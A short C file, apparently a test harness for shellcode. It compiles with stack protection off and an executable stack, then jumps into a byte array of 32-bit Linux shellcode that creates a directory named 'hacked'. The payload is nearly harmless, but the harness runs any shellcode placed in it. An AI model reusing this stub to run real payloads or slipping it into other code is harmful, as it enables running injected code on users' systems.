/*
/ Shellcode stub - just for testing the generated shellcode and give it a runtime frame
/ compile with: gcc -z execstack -fno-stack-protector -D_FORTIFY_SOURCE shellcode.c -o shellcode -g -ggdb
/
*/

unsigned char code[] = \
"\xeb\x16\x5e\x31\xc0\x88\x46\x06\xb0\x27\x8d\x1e\x66\xb9\xed\x01\xcd\x80\xb0\x01\x31\xdb\xcd\x80\xe8\xe5\xff\xff\xff\x68\x61\x63\x6b\x65\x64\x23";

main()
{
	int (*ret)() = (int(*)())code;
	ret();
}
